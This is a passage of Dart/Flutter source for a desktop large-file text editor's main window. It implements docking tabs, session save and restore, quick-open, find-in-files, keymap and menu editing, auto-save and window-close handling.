import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math' as math;

import 'package:desktop_drop/desktop_drop.dart';
import 'package:docking/docking.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:window_manager/window_manager.dart';

import '../l10n/app_localizations.dart';
import '../main.dart' show MyApp;
import '../menu/json_menu_bar.dart';
import '../menu/menu_bar_keys.dart';
import '../menu/menu_merge.dart';
import '../menu/menu_editor_page.dart';
import '../menu/quick_pick.dart';
import '../settings/about_page.dart';
import '../settings/app_settings.dart';
import '../settings/resizable_dialog.dart';
import '../settings/appearance_page.dart';
import '../settings/color_settings_page.dart';
import '../settings/config_loader.dart';
import '../settings/donate_page.dart';
import '../settings/file_assoc_page.dart';
import '../settings/font_settings_page.dart';
import '../settings/settings_page.dart';
import '../util/dispose_later.dart';
import '../util/log.dart';
import '../util/mac_files.dart';
import '../util/single_instance.dart';
import 'editor_view.dart';
import 'encoding/codecs.dart';
import 'bookmark_panel.dart';
import 'diff_view.dart';
import 'file_explorer_panel.dart';
import 'find_in_files_panel.dart';
import '../settings/keymap_editor_page.dart';
import 'keybinding/commands.dart' show CommandRegistry;
import 'keybinding/key_chord.dart' show chordsLabel;
import 'keybinding/keymap.dart';
import 'keybinding/user_keymap.dart';
import 'macro.dart';
import 'merge_view.dart';
import 'outline.dart';
import 'outline_panel.dart';
import 'print_page.dart';
import 'run_commands.dart';
import 'clipboard_history.dart';
import '../settings/column_editor_page.dart';
import '../settings/run_page.dart';
import 'user_script.dart';
import 'wasm_grammar.dart';
import 'file_explorer.dart' show baseName;
import 'quick_open.dart' show scanFilesUnder;

// Diff panes get ids from this range (no controller, never persisted).
const int _diffIdBase = 1 << 30;

// AppBar / body background and foreground: follow the active colour theme
// (readable in both dark and light).
Color get _barBg => Color(AppSettings.instance.chromeBgArgb);
Color get _bodyBg => Color(AppSettings.instance.bgArgb);
Color get _barFg => Color(AppSettings.instance.fgArgb);

/// Large-file editor shell: a menubar / AppBar on top plus one docking
/// workspace (multi-file tabs / drag-to-split).
///
/// Every opened file = one [EditorController] + [EditorView], wrapped in a
/// docking `DockingItem` and added to the [DockingLayout] (drag to a pane edge
/// to split horizontally/vertically; reorderable; closable). Menubar / AppBar
/// commands target the "currently active controller" (decided by the docking
/// selection or by a pane taking focus); the AppBar listens to the active
/// controller to show its file name / modified state / index progress / keymap.
class LargeFileEditorPage extends StatefulWidget {
  const LargeFileEditorPage({
    super.key,
    this.initialPaths = const [],
    this.sessionEnabled = true,
  });

  /// False for a --new-window process: session is neither restored nor
  /// saved (two processes writing settings.json would overwrite each other).
  final bool sessionEnabled;

  /// Files from the command line ("open with" / file association), opened as
  /// extra tabs after the session is restored.
  final List<String> initialPaths;

  @override
  State<LargeFileEditorPage> createState() => _LargeFileEditorPageState();
}

class _LargeFileEditorPageState extends State<LargeFileEditorPage>
    with WindowListener {
  // Docking layout (root == null = no file open yet). A ChangeNotifier, so
  // changes repaint automatically.
  final DockingLayout _layout = _FixedDockingLayout();

  // Each DockingItem id → its editor controller / canonical path (for the
  // duplicate-open check).
  final Map<int, EditorController> _controllers = {};

  // ── Keyboard access to the menu bar ──────────────────────────────
  // F10 / lone Alt (Windows, Linux) or ⌃F2 (macOS) opens the first menu and
  // gives it focus; MenuBar's own traversal takes it from there. Observed
  // through a HardwareKeyboard handler, so it works whatever has focus
  // (editor, sidebar, search bar) and needs no widget wrapping; the handler
  // only watches (returns false), it never blocks the focused widget.
  final MenuController _menuBarCtl = MenuController();
  final FocusNode _menuBarFocus = FocusNode(debugLabel: 'menubar');
  final MenuBarKeys _menuKeys = MenuBarKeys(isMac: Platform.isMacOS);

  bool _onGlobalKey(KeyEvent e) {
    if (_menuKeys.toggles(e)) _toggleMenuBar();
    return false;
  }

  void _toggleMenuBar() {
    if (!mounted || _menus.isEmpty) return;
    // Not while a dialog (or any other route) is on top of the shell.
    if (ModalRoute.of(context)?.isCurrent == false) return;
    if (_menuBarCtl.isOpen) {
      _menuBarCtl.close();
      return;
    }
    _menuBarFocus.requestFocus();
    _menuBarCtl.open();
  }
  final Map<int, String> _paths = {};
  int _nextId = 1;
  int? _activeId; // currently active item id (target of menubar/AppBar commands)

  // Menubar (native MenuBar; structure defined by JSON, text localized via ARB).
  List<MenuNode> _menus = const [];

  /// A file drag is hovering the window (drop-target overlay shown).
  bool _dragHover = false;

  // ── find in files (bottom panel) ──
  bool _fifOpen = false;
  double _fifHeight = 260; // drag-resizable via the handle above the panel
  final GlobalKey<FindInFilesPanelState> _fifKey = GlobalKey();

  // Quick font zoom (menu / command palette path). Zoom is a global setting,
  // so it works without a pane too; the pane variant just adds the toast.
  void _zoomFont(int steps) {
    final a = _active;
    if (a != null) {
      a.zoomFont(steps);
    } else {
      AppSettings.instance.zoomFont(steps);
    }
  }

  // Open (or re-focus) the find-in-files panel; the folder field prefills
  // with the active file's directory on first open. [replace] (ctrl+shift+h)
  // also expands the replace row.
  void _openFindInFiles({bool replace = false}) {
    if (!_fifOpen) setState(() => _fifOpen = true);
    WidgetsBinding.instance.addPostFrameCallback((_) {
      final st = _fifKey.currentState;
      if (replace) st?.showReplace();
      st?.focusQuery();
    });
  }

  // ── Quick pick dialogs (ctrl+p / ctrl+r / ctrl+k m) ──

  // ctrl+p: fuzzy-pick a file from the open tabs, the recent list and (in
  // batches, while typing) the explorer root's tree.
  Future<void> _quickOpen() async {
    final l10n = AppLocalizations.of(context);
    final seen = <String>{};
    final items = <QuickItem>[];
    void add(String path, int group) {
      final canon = _canonical(path);
      if (!seen.add(canon)) return;
      final f = File(path);
      items.add(QuickItem(baseName(path), f.parent.path, path, group: group));
    }

    for (final p in _paths.values) {
      add(p, 0);
    }
    for (final p in AppSettings.instance.recentFiles) {
      add(p, 1);
    }
    var cancelled = false;
    final root = AppSettings.instance.explorerRoot.isNotEmpty
        ? AppSettings.instance.explorerRoot
        : _defaultExplorerRoot();
    final more = scanFilesUnder(root, cancelled: () => cancelled).map(
      (batch) => [
        for (final p in batch)
          if (seen.add(_canonical(p)))
            QuickItem(baseName(p), File(p).parent.path, p, group: 2),
      ],
    );
    final picked = await showQuickPick(
      context,
      hint: l10n.tr('quick_open_hint'),
      items: items,
      more: more,
      emptyText: l10n.tr('quick_open_empty'),
    );
    cancelled = true;
    if (!mounted || picked == null) return;
    _openCliPaths([picked]);
    _bringToFront();
  }

  // ctrl+r: the recent-files list as a quick pick.
  Future<void> _pickRecent() async {
    final l10n = AppLocalizations.of(context);
    final files = AppSettings.instance.recentFiles;
    final picked = await showQuickPick(
      context,
      hint: l10n.tr('recent_pick_hint'),
      items: [
        for (final p in files)
          QuickItem(baseName(p), File(p).parent.path, p, group: 1),
      ],
      emptyText: l10n.tr('recent_none'),
    );
    if (!mounted || picked == null) return;
    _openRecentFile(picked);
  }

  // ctrl+\: split the editor to the right. A file is one Document per
  // window (the same path never opens twice), so unlike VS Code the split
  // cannot show the same file twice: with other tabs in the group the active
  // tab moves into a new right-hand split; alone in its group, a new
  // untitled pane opens on the right instead.
  void _splitEditor() {
    final id = _activeId;
    final item = id == null ? null : _layout.findDockingItem(id);
    if (item == null) return;
    final parent = item.parent;
    if (parent is DockingTabs && parent.childrenCount > 1) {
      _layout.moveItem(
        draggedItem: item,
        targetArea: parent,
        dropPosition: DropPosition.right,
      );
      _selectItem(id!);
      return;
    }
    final nid = _nextId++;
    final ni = _buildPaneItem(nid, null);
    _layout.addItemOn(
      newItem: ni,
      targetArea: item,
      dropPosition: DropPosition.right,
    );
    _selectItem(nid);
  }

  // ctrl+k m: pick the active file's syntax (same options as the menu).
  Future<void> _pickSyntax() async {
    final active = _active;
    if (active == null) return;
    final l10n = AppLocalizations.of(context);
    final picked = await showQuickPick(
      context,
      hint: l10n.tr('syntax_pick_hint'),
      items: [
        QuickItem(l10n.tr('syntax_auto'), '', 'auto'),
        for (final lang in WasmGrammarRegistry.instance.languages)
          QuickItem(lang, '', lang),
        QuickItem(l10n.tr('syntax_plain'), '', 'plain'),
      ],
    );
    if (!mounted || picked == null) return;
    active.setSyntax(picked);
  }

  // A result row was clicked: open/jump and select the match's byte range
  // (selection is queued when the pane is still loading).
  void _openFifMatch(String path, int start, int end) {
    if (!File(path).existsSync()) return; // deleted since the search ran
    final canon = _canonical(path);
    _touchRecent(path);
    int? id;
    for (final e in _paths.entries) {
      if (e.value == canon) {
        id = e.key;
        break;
      }
    }
    if (id != null) {
      _selectItem(id);
    } else {
      id = _addEditorPane(path, canon);
    }
    _controllers[id]?.selectRange(start, end);
  }

  // Replace-in-files hook for files that are open in a pane: the buffer is
  // edited (one undo step, left modified) instead of rewriting the disk
  // file underneath the pane. null = not open (or the pane can't take it),
  // so the core rewrites the file on disk.
  Future<int?> _replaceInOpenPane(
    String path,
    RegExp re,
    String replacement,
    bool regex,
  ) {
    final canon = _canonical(path);
    for (final e in _paths.entries) {
      if (e.value == canon) {
        final c = _controllers[e.key];
        if (c == null) break;
        return c.replaceAllMatches(re, replacement, regex: regex);
      }
    }
    return Future.value(null);
  }

  // Items deleted in the menu editor (main_menu.json's `deleted` array):
  // never rendered, but kept so the editor can offer restoring them.
  List<MenuNode> _deletedMenus = const [];

  // Toolbar (settings/toolbar.json): flat MenuNode list; buttons dispatch
  // through _onMenuAction like menu items. No deleted area — removed items
  // just reappear in the editor's derived "unused" list.
  List<MenuNode> _toolbarItems = const [];

  // Session persistence: window geometry / docking layout / open files with
  // caret positions, saved into settings.json (debounced on changes, final
  // write on window close) and restored on the next start.
  Timer? _sessionDebounce;

  // Poll for files changed on disk by other programs (active pane only; the
  // full sweep runs on window focus).
  Timer? _extCheckTimer;

  // False until window_manager responds — i.e. a real native window exists.
  // Widget tests have none: session saving is disabled there so tests never
  // write a settings.json.
  bool _windowReady = false;

  EditorController? get _active =>
      _activeId == null ? null : _controllers[_activeId];

  @override
  void initState() {
    super.initState();
    HardwareKeyboard.instance.addHandler(_onGlobalKey);
    // Both reconcile their file with the packaged defaults; whatever they had
    // to add is announced once, after both are done (see _announceMerges).
    // The script-update part of the notice needs main()'s deferred seeding.
    Future.wait([
      _loadMenus(),
      _loadToolbar(),
      deferredStartup ?? Future.value(),
    ]).then((_) => _announceMerges());
    // The scripts registry fills in after the first frame (main()'s deferred
    // startup), but the Tools submenu's items are built with the shell (a
    // SubmenuButton takes a list, nothing is generated on expand) — so the
    // menu showed the empty first-frame snapshot until something else
    // happened to rebuild the shell. Rebuild once the registry is loaded.
    (deferredStartup ?? Future.value()).then((_) {
      if (mounted) setState(() {});
    });
    AppSettings.instance.addListener(_onSettingsChanged);
    _setupAutoSave();
    _macro.addListener(_onMacroChanged);
    UserKeymap.instance.addListener(_onUserKeymapChanged);
    UserKeymap.instance.load(); // notifies → labels + every pane reload
    _refreshEffectiveBindings();
    _refreshMacroNames();
    _loadRunCommands();
    _layout.addListener(_scheduleSessionSave);
    windowManager.addListener(this);
    // Single-instance handoff: a second launch's file paths arrive here.
    // (null in widget tests / when the guard could not claim.)
    SingleInstance.current?.onArgs = _onForwardedPaths;
    WidgetsBinding.instance.addPostFrameCallback(
      (_) => Log.instance.mark('shell first frame'),
    );
    // External change detection: a slow poll of the active pane backs up the
    // window-focus / tab-activation checks (covers "changed while we stayed
    // focused", e.g. a build script rewriting the open file).
    _extCheckTimer = Timer.periodic(
      const Duration(seconds: 3),
      (_) => _active?.checkExternalChange(),
    );
    // Intercept close so the session gets its final (exact-caret) save.
    () async {
      try {
        await windowManager.setPreventClose(true);
        _windowReady = true;
        await _cacheWindowState(); // baseline before any resize/move event
      } catch (_) {} // headless tests: no native window
    }();
    if (!widget.sessionEnabled) {
      // --new-window: do not restore the session (it belongs to the main
      // window); open a blank document plus the command-line files.
      _restoreBlank();
    } else if (MacFiles.isActive) {
      // Sandbox: the saved paths are unreachable until their bookmarks re-grant access, and that
      // is an async round trip — so macOS restores one frame later than the other platforms.
      () async {
        await _reclaimSessionAccess();
        if (!mounted) return;
        _restoreSession();
        setState(() {});
        // Files LaunchServices handed over (Finder / file association): install
        // the listener first — the native side re-buffers anything it could not
        // deliver, so polling before the handler exists loses the file — then
        // drain what arrived before we were listening.
        MacFiles.onOpenFiles = (paths) {
          if (!mounted) return;
          _openCliPaths(paths);
          _bringToFront();
        };
        final pending = await MacFiles.pendingOpenFiles();
        if (mounted && pending.isNotEmpty) _openCliPaths(pending);
      }();
    } else {
      _restoreSession();
    }
  }

  void _restoreBlank() {
    _newUntitledPane();
    _openCliPaths(widget.initialPaths);
  }

  // Re-grant sandbox access to every session file that carries a bookmark, dropping the ones whose
  // bookmark no longer resolves (the user must reopen those through the panel) and following the
  // ones the user moved on disk. No-op off macOS.
  Future<void> _reclaimSessionAccess() async {
    final s = AppSettings.instance;
    final kept = <SessionFile>[];
    for (final f in s.sessionFiles) {
      final b = f.bookmark;
      if (b == null || b.isEmpty) {
        kept.add(f); // pre-bookmark session, or a path that never had a grant
        continue;
      }
      final path = await MacFiles.startAccess(b);
      if (path == null) {
        Log.instance.w(
          'session: sandbox bookmark unusable, dropping ${f.path}',
        );
        continue;
      }
      kept.add(path == f.path ? f : f.withPath(path));
    }
    s.sessionFiles = kept;
  }

  // ── session ──────────────────────────────────────────────────

  void _scheduleSessionSave() {
    _sessionDebounce?.cancel();
    _sessionDebounce = Timer(const Duration(seconds: 1), _saveSession);
  }

  // Window geometry is cached into the settings fields as it changes, so
  // the close path never has to query the (possibly already hidden) window.
  Future<void> _cacheWindowState() async {
    if (!_windowReady) return;
    final s = AppSettings.instance;
    try {
      s.winMaximized = await windowManager.isMaximized();
      if (!s.winMaximized) {
        final b = await windowManager.getBounds();
        s.winX = b.left;
        s.winY = b.top;
        s.winW = b.width;
        s.winH = b.height;
      }
    } catch (_) {}
  }

  void _onWindowChanged() {
    _cacheWindowState();
    _scheduleSessionSave();
  }

  // Back in the foreground: the classic moment files were edited elsewhere.
  // Sequential await keeps multiple prompts from stacking on top of each other.
  @override
  void onWindowFocus() {
    for (final c in _controllers.values) {
      c.setWindowFocused(true);
    }
    _explorerKey.currentState?.refresh(); // files may have changed outside
    _captureClipboard();
    () async {
      for (final c in List.of(_controllers.values)) {
        await c.checkExternalChange();
      }
    }();
  }

  @override
  void onWindowResized() => _onWindowChanged();
  @override
  void onWindowMoved() => _onWindowChanged();
  @override
  void onWindowMaximize() => _onWindowChanged();
  @override
  void onWindowUnmaximize() => _onWindowChanged();

  // Whether the final close sequence already ran. Re-entry guard: the real
  // close below triggers a second WM_CLOSE 'close' event, and a second
  // _saveSession would then record the (now hidden) window's state — e.g.
  // clobber winMaximized with false.
  bool _closing = false;

  @override
  void onWindowClose() async {
    if (_closing) return;
    _closing = true;
    // Unsaved changes: ask BEFORE hiding — the dialog needs the window.
    // Cancel (or a canceled Save As) aborts the close entirely.
    try {
      if (!await _confirmCloseAll()) {
        _closing = false;
        return;
      }
    } catch (_) {}
    // Hide FIRST: everything after (saving, the native close, process
    // teardown incl. the seconds-long Rust DLL unload) happens with the
    // window already gone, so the user never sees a frozen window. The
    // geometry was cached on the resize/move/maximize events — nothing here
    // queries the now-hidden window.
    try {
      await windowManager.hide();
    } catch (_) {}
    try {
      await _saveSession().timeout(const Duration(seconds: 3));
    } catch (_) {}
    // Stop the single-instance guard (drops the lock file) so a launch racing
    // our shutdown claims immediately instead of failing a handshake first.
    try {
      await SingleInstance.current?.close();
    } catch (_) {}
    // NOT windowManager.destroy(): that is just PostQuitMessage — it skips
    // DestroyWindow and leaves the window lingering during teardown.
    try {
      await windowManager.setPreventClose(false);
    } catch (_) {}
    await windowManager.close();
  }

  Future<void> _saveSession() async {
    if (!widget.sessionEnabled) return; // --new-window: never writes the session
    _sessionDebounce?.cancel();
    if (!_windowReady) return; // headless tests: nothing to persist
    final s = AppSettings.instance;
    // Window geometry comes from the cache _onWindowChanged keeps — never
    // queried here (the close path runs with the window already hidden).
    final files = <SessionFile>[];
    for (final e in _controllers.entries) {
      final path = e.value.path;
      if (path == null) continue; // untitled panes are not persisted
      files.add(
        SessionFile(
          id: e.key,
          path: path,
          caret: e.value.caretOffset,
          anchor: e.value.anchorOffset,
          encoding: e.value.manualEncoding,
          bookmarks: e.value.bookmarks,
          wrap: e.value.wrapOverride,
          // macOS sandbox: without this the path is unreachable after a relaunch.
          bookmark: await MacFiles.bookmarkOf(path),
        ),
      );
    }
    s.sessionFiles = files;
    s.sessionLayout = _layout.root == null
        ? ''
        : _layout.stringify(parser: const _SessionIdParser());
    s.sessionActiveId = _activeId ?? -1;
    await s.save();
  }

  // Restore the saved docking layout (files that vanished become untitled
  // panes; a broken layout string falls back to plain tabs); nothing to
  // restore → one blank untitled document, the startup default.
  void _restoreSession() {
    final s = AppSettings.instance;
    final byId = <int, SessionFile>{};
    for (final f in s.sessionFiles) {
      if (f.id >= 0 && File(f.path).existsSync()) byId[f.id] = f;
    }
    var maxId = 0;
    for (final id in byId.keys) {
      if (id > maxId) maxId = id;
    }
    _nextId = maxId + 1;
    if (byId.isNotEmpty && s.sessionLayout.isNotEmpty) {
      try {
        _layout.load(
          layout: s.sessionLayout,
          parser: const _SessionIdParser(),
          builder: _SessionAreaBuilder(this, byId),
        );
        // Diff panes are not persisted: a layout saved with one open comes
        // back with a blank placeholder in its slot — drop it.
        final stale = [
          for (final it in _allItems())
            if ((it.id as int) >= _diffIdBase) it.id as int,
        ];
        if (stale.isNotEmpty) {
          _layout.removeItemByIds(stale);
          for (final id in stale) {
            _paths.remove(id);
            _controllers.remove(id)?.dispose();
          }
        }
      } catch (e) {
        Log.instance.w('session: layout restore failed, using tabs: $e');
        for (final c in _controllers.values) {
          c.dispose();
        }
        _controllers.clear();
        _paths.clear();
        final items = [for (final f in byId.values) _buildPaneItem(f.id, f)];
        _layout.root = items.length == 1 ? items.first : DockingTabs(items);
      }
    }
    // Files from the command line: open them as extra tabs after the restored
    // session. When any was given, the focus goes to the last of them, not to
    // the session's saved active pane.
    final cliOpened = _openCliPaths(widget.initialPaths);
    if (_layout.root == null) {
      _newUntitledPane();
      return;
    }
    if (cliOpened) {
      return; // the CLI file keeps focus over the saved active pane
    }
    final act = byId.containsKey(s.sessionActiveId)
        ? s.sessionActiveId
        : (_firstItem(_layout.root!)?.id as int?);
    if (act != null) {
      WidgetsBinding.instance.addPostFrameCallback((_) {
        // On macOS a file handed over by LaunchServices arrives through an
        // async round trip that can land either side of this callback; whoever
        // is last wins the focus. A file the user actually asked for beats the
        // session's saved pane, so stand down once one has been opened.
        if (mounted && !_externalOpenTookFocus) _selectItem(act);
      });
    }
  }

  // Open files handed over on the command line — at startup, or forwarded by
  // a second instance. Already open (restored, or given twice) → jump to that
  // tab; missing on disk → warn and skip. True when any was opened/focused.
  bool _openCliPaths(List<String> paths) {
    var opened = false;
    for (final raw in paths) {
      final file = File(raw);
      if (!file.existsSync()) {
        Log.instance.w('command line: file not found, skipped: $raw');
        continue;
      }
      final path = file.absolute.path;
      final canon = _canonical(path);
      int? existingId;
      for (final e in _paths.entries) {
        if (e.value == canon) {
          existingId = e.key;
          break;
        }
      }
      if (existingId != null) {
        _selectItem(existingId);
      } else {
        _addEditorPane(path, canon);
      }
      _touchRecent(path);
      opened = true;
    }
    if (opened) _externalOpenTookFocus = true;
    return opened;
  }

  /// A file the user handed to the app (command line, file association, a
  /// second launch) has taken the focus — the session's saved active pane must
  /// not steal it back when its post-frame callback fires. See [_restoreSession].
  bool _externalOpenTookFocus = false;

  // Record [path] as the most-recently opened file (newest first, deduped by
  // canonical path, capped) and persist. Every user-driven open funnels here;
  // session restore deliberately does not.
  void _touchRecent(String path) {
    final s = AppSettings.instance;
    final canon = _canonical(path);
    s.recentFiles.removeWhere((p) => _canonical(p) == canon);
    s.recentFiles.insert(0, path);
    if (s.recentFiles.length > AppSettings.recentFilesMax) {
      s.recentFiles.length = AppSettings.recentFilesMax;
    }
    s.save();
  }

  // File → Recent Files clicked: open (jump when already open); a file that no
  // longer exists is dropped from the list with a notice.
  void _openRecentFile(String path) {
    if (!File(path).existsSync()) {
      final s = AppSettings.instance;
      final canon = _canonical(path);
      s.recentFiles.removeWhere((p) => _canonical(p) == canon);
      s.save();
      if (mounted) {
        setState(() {});
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(AppLocalizations.of(context).tr('recent_missing')),
          ),
        );
      }
      return;
    }
    _openCliPaths([path]); // same jump-if-open flow (also re-touches recency)
  }

  // A second launch forwarded its file paths (single-instance handoff): open
  // them and bring this window to the foreground — with no paths (bare
  // double-click of the exe) it is just "come to front".
  void _onForwardedPaths(List<String> paths) {
    if (!mounted) return;
    _openCliPaths(paths);
    _bringToFront();
  }

  // Raise + focus this window. focus() (SetForegroundWindow) is refused when
  // another process owns the foreground — the second instance grants us the
  // right before handing off (AllowSetForegroundWindow, see single_instance),
  // and the always-on-top pulse still raises the window even when the grant
  // is missing (e.g. after a file drop, where the drag source keeps focus).
  Future<void> _bringToFront() async {
    try {
      if (await windowManager.isMinimized()) await windowManager.restore();
      await windowManager.show();
      await windowManager.setAlwaysOnTop(true);
      await windowManager.setAlwaysOnTop(false);
      await windowManager.focus();
    } catch (_) {}
  }

  // Build one pane (registered in the id maps): a file from the session, or
  // an untitled blank document when [f] is null.
  DockingItem _buildPaneItem(
    int id,
    SessionFile? f, {
    double? weight,
    bool maximized = false,
  }) {
    final controller = EditorController();
    controller.onActivated = () => _setActive(id);
    controller.onNewTab = _newUntitledPane;
    controller.onNewWindow = _openNewWindow;
    controller.onCloseWindow = _closeWindow;
    controller.onOpenFile = _openNewFile;
    controller.onCloseRequest = () => _requestClosePane(id);
    controller.onTabCycle = _cycleTab;
    controller.onTabSelectN = _gotoTabN;
    controller.onReopenClosed = _reopenClosedTab;
    controller.onCommandPalette = _openCommandPalette;
    controller.onFindInFiles = _openFindInFiles;
    // Keyboard path: the editor already recorded the command for a macro,
    // so the shell must not record it again.
    controller.onMenuAction = (a) => _onMenuAction(a, fromKey: true);
    controller.onMacroRecord = _toggleMacroRecord;
    controller.onMacroPlay = _playLastMacro;
    controller.onToggleExplorer = _toggleExplorer;
    controller.onToggleOutline = _toggleOutlinePanel;
    controller.onKeymapEditor = _openKeymapEditor;
    controller.onPrint = _openPrintDialog;
    controller.onRunMacro = _runSavedMacro;
    controller.onRunPrompt = _runPrompt;
    controller.onRunNamed = _runNamed;
    controller.onClipboardHistory = _openClipboardHistory;
    controller.onColumnEditor = _openColumnEditor;
    controller.onScrollRows = (n) => _syncScroll(id, rows: n);
    controller.onScrollX = (x) => _syncScroll(id, x: x);
    controller.bookmarksEpoch.addListener(() => _bookmarkTick.value++);
    _controllers[id] = controller;
    if (f != null) _paths[id] = _canonical(f.path);
    return DockingItem(
      id: id,
      // The visible title is rendered by [leading] (so it can carry a
      // full-path tooltip and a right-click menu — TabData.text can't);
      // name stays empty or the tab would show the title twice.
      name: '',
      leading: (context, status) => _tabTitle(context, id, f?.path),
      keepAlive: true,
      weight: weight,
      maximized: maximized,
      widget: f == null
          ? EditorView(controller: controller, startBlank: true)
          : EditorView(
              controller: controller,
              initialPath: f.path,
              initialCaret: f.caret,
              initialAnchor: f.anchor,
              initialEncoding: f.encoding,
              initialBookmarks: f.bookmarks,
              initialWrap: f.wrap,
            ),
    );
  }

  // Default when the app starts (or the last tab is closed): one blank untitled document.
  void _newUntitledPane() {
    final id = _nextId++;
    final item = _buildPaneItem(id, null);
    if (_layout.root == null) {
      _layout.root = item;
    } else {
      final target = _firstItem(_layout.root!);
      final parent = target?.parent;
      if (parent is DockingTabs) {
        _layout.addItemOn(
          newItem: item,
          targetArea: parent,
          dropIndex: parent.childrenCount,
        );
      } else if (target != null) {
        _layout.addItemOn(newItem: item, targetArea: target, dropIndex: 1);
      }
    }
    _selectItem(id);
  }

  // Settings applied (colors / keymap / language): rebuild the bar.
  void _onSettingsChanged() {
    _refreshEffectiveBindings(); // the preset may have changed
    _setupAutoSave();
    if (mounted) setState(() {});
  }

  // ── print (File → Print..., ctrl+p) ────────────────────────
  void _openPrintDialog() {
    final c = _active;
    if (c == null || !c.hasDoc) return;
    showPrintDialog(context, c);
  }

  // ── auto save (Settings → Advanced...) ─────────────────────
  Timer? _autoSaveTimer;

  void _setupAutoSave() {
    _autoSaveTimer?.cancel();
    _autoSaveTimer = null;
    final s = AppSettings.instance;
    if (s.autoSave == 'afterDelay') {
      _autoSaveTimer = Timer.periodic(
        Duration(seconds: s.autoSaveDelaySec),
        (_) => _autoSaveAll(),
      );
    }
  }

  // Save every modified, file-backed, writable pane (untitled ones would
  // need a Save As dialog — never automatic).
  void _autoSaveAll() {
    for (final c in List.of(_controllers.values)) {
      if (c.modified && !c.saving && c.path != null && !c.readOnly) c.save();
    }
  }

  @override
  void onWindowBlur() {
    _menuKeys.reset(); // Alt+Tab: the Alt release never reaches us
    for (final c in _controllers.values) {
      c.setWindowFocused(false);
    }
    if (AppSettings.instance.autoSave == 'onFocusChange') _autoSaveAll();
  }

  // ── shortcuts: live labels and the keymap editor ─────────────
  // The effective keymap (preset + settings/keymaps/user.json) drives the
  // shortcut labels in menus / the command palette, so a custom binding is
  // what the menu shows. Recomputed when the preset or the overlay changes.
  List<KeyBinding> _effectiveBindings = const [];
  String? _presetDefaultMode;
  final CommandRegistry _commandNames = CommandRegistry.defaults();

  Future<void> _refreshEffectiveBindings() async {
    try {
      final km = await loadKeymapByName(
        AppSettings.instance.keymap,
        (n) async =>
            (jsonDecode(await loadConfigString('keymaps/$n.json')) as Map)
                .cast<String, Object?>(),
        isMac: Platform.isMacOS,
      );
      _presetDefaultMode = km.defaultMode;
      // Menu labels show only this platform's bindings (the macOS half of
      // a platform pair must not label a Windows menu).
      _effectiveBindings = activeOnPlatform(
        mergeBindings(km.bindings, UserKeymap.instance.bindings),
        Platform.operatingSystem,
      );
    } catch (e) {
      Log.instance.w('keymap labels: $e');
    }
    if (mounted) setState(() {});
  }

  void _onUserKeymapChanged() => _refreshEffectiveBindings();

  // Label for a menu action: the last (highest-priority) global binding,
  // else one in the preset's default mode. '' = a keyable command with no
  // binding (hide the static label); null = not a keymap command at all.
  String? _shortcutFor(String action) {
    if (_commandNames.lookup(action) == null) return null;
    final pick = labelBindingFor(
      _effectiveBindings,
      action,
      mode: _presetDefaultMode,
    );
    return pick == null ? '' : chordsLabel(pick.chords);
  }

  Future<void> _openKeymapEditor() async {
    final l10n = AppLocalizations.of(context);
    // Commands: menu actions (with their localized path) that the keymap
    // knows, then any registered command not in the menus, then the
    // dynamic-menu items as argful commands.
    final entries = <KeymapEntry>[];
    final seen = <String>{};
    void walk(List<MenuNode> ns, String prefix) {
      for (final n in ns) {
        if (n.isSeparator || n.dynamicId != null) continue;
        final own = l10n.tr(n.labelKey ?? n.action ?? '');
        final label = prefix.isEmpty ? own : '$prefix › $own';
        if (n.children != null) {
          walk(n.children!, label);
        } else if (n.action != null &&
            _commandNames.lookup(n.action!) != null &&
            seen.add(n.action!)) {
          entries.add(KeymapEntry(label, n.action!));
        }
      }
    }

    walk(_menus, '');
    for (final c in _commandNames.names) {
      if (c == 'noop' || seen.contains(c)) continue;
      if (const {
        'script.run',
        'syntax.set',
        'encoding.set',
        'macro.run',
        'run.command',
      }.contains(c)) {
        continue; // listed per item below
      }
      if (c == 'view.gotoTab') {
        for (var n = 1; n <= 9; n++) {
          entries.add(
            KeymapEntry('${l10n.tr('menu_view')} › $c $n', c, args: {'n': n}),
          );
        }
        continue;
      }
      entries.add(KeymapEntry(c, c));
    }
    final tools = l10n.tr('menu_tools');
    for (final s in UserScriptRegistry.instance.names) {
      entries.add(KeymapEntry('$tools › $s', 'script.run', args: {'name': s}));
    }
    final syntax = l10n.tr('menu_syntax');
    for (final m in [
      'auto',
      ...WasmGrammarRegistry.instance.languages,
      'plain',
    ]) {
      final label = m == 'auto'
          ? l10n.tr('syntax_auto')
          : m == 'plain'
          ? l10n.tr('syntax_plain')
          : m;
      entries.add(
        KeymapEntry('$syntax › $label', 'syntax.set', args: {'mode': m}),
      );
    }
    final enc = l10n.tr('menu_encoding');
    for (final (_, codecs) in textCodecMenuGroups) {
      for (final c in codecs) {
        entries.add(
          KeymapEntry(
            '$enc › ${c.name}',
            'encoding.set',
            args: {'name': c.name},
          ),
        );
      }
    }
    final macro = l10n.tr('menu_macro');
    for (final m in _macroNames) {
      entries.add(KeymapEntry('$macro › $m', 'macro.run', args: {'name': m}));
    }
    final run = l10n.tr('menu_run');
    for (final c in _runCommands) {
      entries.add(
        KeymapEntry('$run › ${c.name}', 'run.command', args: {'name': c.name}),
      );
    }
    await showKeymapEditorDialog(
      context,
      presetName: AppSettings.instance.keymap,
      presetBindings: [
        for (final b in _effectiveBindings)
          if (!UserKeymap.instance.owns(b)) b,
      ],
      defaultMode: _presetDefaultMode,
      entries: entries,
    );
  }

  // The keyboard preset is a global setting: persisted, and applied to every open pane (each
  // EditorView listens to the settings). A custom JSON overlay stays per-pane.
  void _setKeymap(String name) {
    final s = AppSettings.instance;
    s.adopt(AppSettings.from(s)..keymap = name);
  }

  // Menu editor: the dialog edits a deep-copied draft that WE render while it
  // is open (live preview); save keeps it (the dialog wrote the file), cancel
  // restores the original tree.
  Future<void> _openMenuEditor() async {
    final original = _menus;
    final draft = [for (final m in _menus) m.deepCopy()];
    final trashDraft = [for (final m in _deletedMenus) m.deepCopy()];
    setState(() => _menus = draft);
    final saved = await showMenuEditorDialog(
      context,
      draft: draft,
      trash: trashDraft,
      onChanged: () {
        if (mounted) setState(() {});
      },
    );
    if (!mounted) return;
    if (saved) {
      _deletedMenus = trashDraft;
    } else {
      setState(() => _menus = original);
    }
  }

  // Load the menu structure config (settings/menus/main_menu.json, falling
  // back to the bundled default).
  /// Load the menu tree: the user's external file when there is one, merged
